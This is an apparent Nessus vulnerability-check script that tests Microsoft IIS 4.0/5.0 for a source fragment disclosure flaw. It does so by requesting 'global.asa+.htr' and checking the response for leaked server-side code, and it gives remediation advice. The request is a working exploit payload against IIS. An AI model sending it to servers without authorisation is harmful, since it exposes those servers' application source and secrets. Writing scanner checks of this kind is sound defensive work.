#
# Test Microsoft IIS 4.0/5.0 Source Fragment Disclosure Vulnerability
#
# Script writen by Pedro Antonio Nieto Feijoo <pedron@cimex.com.cu>
#

if(description)
{
 script_id(10680);
 script_bugtraq_id(1193, 1488);
 script_version ("$Revision: 1.25 $");
 script_cve_id("CVE-2000-0457", "CVE-2000-0630");

 name["english"] = "Test Microsoft IIS Source Fragment Disclosure";

 script_name(english:name["english"]);

 desc["english"] = "
Microsoft IIS 4.0 and 5.0 can be made to disclose
fragments of source code which should otherwise be
inaccessible. This is done by appending +.htr to a
request for a known .asp (or .asa, .ini, etc) file.

Solution : .htr script mappings should be removed if not required.

- open Internet Services Manager
- right click on the web server and select properties
- select WWW service | Edit | Home Directory | Configuration
- remove the application mappings reference to .htr

If .htr functionality is required, install the relevant patches 
from Microsoft (MS01-004)
See also: http://www.microsoft.com/technet/security/bulletin/MS01-004.mspx
Risk factor : High";

 script_description(english:desc["english"]);

 summary["english"] = "Test Microsoft IIS Source Fragment Disclosure";
 script_summary(english:summary["english"]);

 script_category(ACT_GATHER_INFO);

 script_copyright(english:"This script is Copyright (C) 2001 Pedro Antonio Nieto Feijoo",
                 francais:"Ce script est Copyright (C) 2001 Pedro Antonio Nieto Feijoo");
 family["english"] = "Remote file access";
 family["francais"] = "Accès aux fichiers distants";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

BaseURL="";        # root of the default app

port = get_http_port(default:80);
if ( ! can_host_asp(port:port) ) exit(0);

if(get_port_state(port))
{
  soc=http_open_socket(port);
  if (soc)
  {
    req = http_get(item:"/", port:port);
    send(socket:soc,data:req);
    data = http_recv(socket:soc);

    if ( ! data ) exit(0);
    if(egrep(pattern:"^HTTP.* 40[123] .*", string:data) )exit(0); # if default response is Access Forbidden, a false positive will result
    if("WWW-Authenticate" >< data)exit(0); 
    http_close_socket(soc);

    # Looking for the 302 Object Moved ...
    if (data)
    {
      if (" 302 " >< data)
      {
        # Looking for Location of the default webapp
        tmpBaseURL=egrep(pattern:"Location:*",string:data);

        # Parsing Path
        if (tmpBaseURL)
        {
          tmpBaseURL=tmpBaseURL-"Location: ";
          len=strlen(tmpBaseURL);
          strURL="";

          for (j=0;j<len;j=j+1)
          {
            strURL = string(strURL,tmpBaseURL[j]);
            if (tmpBaseURL[j]=="/")
            {
              BaseURL=string(BaseURL,strURL);
              strURL="";
            }
          }
        }
      }
    }

    if (BaseURL=="") BaseURL="/";

    # We're going to attack!
    soc = http_open_socket(port);

    if (soc)
    {
      req = http_get(item:BaseURL, port:port);
      send(socket:soc, data:req);
      data = http_recv(socket:soc);
      http_close_socket(soc);
      if ( ! data ) exit(0);
      if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 40[13] .*", string:data))exit(0);
      if("WWW-Authenticate:" >< data)exit(0);
      
      soc = http_open_socket(port);
      if(!soc)exit(0);

      req = http_get(item:string(BaseURL,"global.asa+.htr"), port:port);
      send(socket:soc, data:req);
      code = recv_line(socket:soc, length:1024);
      if(!strlen(code))exit(0);
      data = http_recv(socket:soc);
      http_close_socket(soc);
      
      

      # HTTP/1.x 200 - Command was executed
      if (" 200 " >< code)
      {
        if ("RUNAT"><data)
        {
          security_hole(port:port, protocol:"tcp",
                        data:string("We could disclosure the source 
code of the ", string(BaseURL,"global.asa"), " on the remote web 
server.
This allows an attacker to gain access to fragments of source 
code of the remote applications.

Solution : .htr script mappings should be removed if not required.

- open Internet Services Manager
- right click on the web server and select properties
- select WWW service | Edit | Home Directory | Configuration
- remove the application mappings reference to .htr

If .htr functionality is required, install the relevant patches
from Microsoft (MS01-004)\n
Risk factor : High") );
        }
      }
      # HTTP/1.x 401 - Access denied
      # HTTP/1.x 403 - Access forbidden
      else
      {
        if (" 401 " >< code)
        {
          security_warning(port:port, protocol:"tcp",
                           data:"
It seems that it's possible to disclose fragments
of source code of your web applications which
should otherwise be inaccessible. This is done by
appending +.htr to a request for a known .asp (or
.asa, .ini, etc) file.

Solution : .htr script mappings should be removed if not required.

- open Internet Services Manager
- right click on the web server and select properties
- select WWW service | Edit | Home Directory | Configuration
- remove the application mappings reference to .htr

If .htr functionality is required, install the relevant patches 
from Microsoft (MS01-004)
See also: http://www.microsoft.com/technet/security/bulletin/MS01-004.mspx
Risk factor : High");
        }
        else
        {
          if (" 403 " >< code)
          {
            security_warning(port:port, protocol:"tcp",
                             data:"
It seems that it's possible to disclose fragments
of source code of your web applications which
should otherwise be inaccessible. This is done by
appending +.htr to a request for a known .asp (or
.asa, .ini, etc) file.

Solution : .htr script mappings should be removed if not required.

- open Internet Services Manager
- right click on the web server and select properties
- select WWW service | Edit | Home Directory | Configuration
- remove the application mappings reference to .htr

If .htr functionality is required, install the relevant patches 
from Microsoft (MS01-004)
See also: http://www.microsoft.com/technet/security/bulletin/MS01-004.mspx
Risk factor : High");
          }
        }
      }
    }
  }
}



